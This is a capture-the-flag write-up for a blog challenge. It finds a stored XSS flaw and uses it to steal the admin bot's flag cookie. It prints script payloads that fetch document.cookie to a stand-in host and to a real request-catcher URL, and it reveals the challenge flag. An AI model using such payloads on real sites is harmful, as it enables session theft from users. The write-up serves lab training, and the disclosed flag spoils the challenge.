# Safari Zone [1/2]

We land on a web site with a simple form to post on a blog. My first reflex is to test for XSS with a very basic payload : `<h1> Title </h1>` : 

![[Pasted image 20240906164800.png]]

The html payload has been interpreted as so. So, the site is vulnerable to XSS. But we don't know where the flag could be.  

![[Pasted image 20240906164819.png]]

By analyzing the source code of this challenge we can see that for each new post on the blog a bot is validating the post. 

```js
// ceci est un bot admin qui automatise la validation des posts !
// enfin la validation des posts n'est pas encore implémentée, mais c'est pour bientôt !
// en attendant, le bot visite les posts quand même, c'est déjà ça !
// attention, le cookie flag est secret et ne doit pas être volé /!\

const puppeteer = require('puppeteer');

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function visit(id) {
  const browser = await puppeteer.launch({
    executablePath: process.env.CHROME_BIN || "/usr/bin/google-chrome-stable",
    args: [
      "--no-sandbox",
      "--disable-gpu",
      "--disable-jit",
      "--disable-wasm",
      "--ignore-certificate-errors",
      "--incognito",
    ],
    headless: true,
  });

  try {
    const page = await browser.newPage();
    await page.setCookie({
      name: "flag",
      value: process.env.FLAG || "Star{fake_flag}",
      domain: "localhost",
    });
    const port = process.env.PORT || 1337;
    await page.goto(`http://localhost:${port}/post/${id}`);
    await sleep(1000);
    await page.close();
  } catch (e) {
    console.error("Error during visit:", e.message);
  } finally {
    await browser.close();
  }
}

module.exports = { visit };
```

That means that after one post the flag has been stored as a cookie on the backend server. Using the XSS we will drop the cookie on the backend and then forward the cookie to a listener. The payload is : 

```html
<script> fetch('http://your-server.com/log?cookie=' + document.cookie); </script>
```

We create a https://requestcatcher.com/ page : https://drachh.requestcatcher.com

```html
<script> 
	fetch('https://drachh.requestcatcher.com?cookie=' + document.cookie); 
</script>
```

We post a new article on the blog and then we wait for the request catcher to get the flag : 

![[Pasted image 20240906165820.png]]

![[Pasted image 20240906165836.png]]

Flag : `Star{l00k_at_m3_1m_th3_adm1n_n0w}`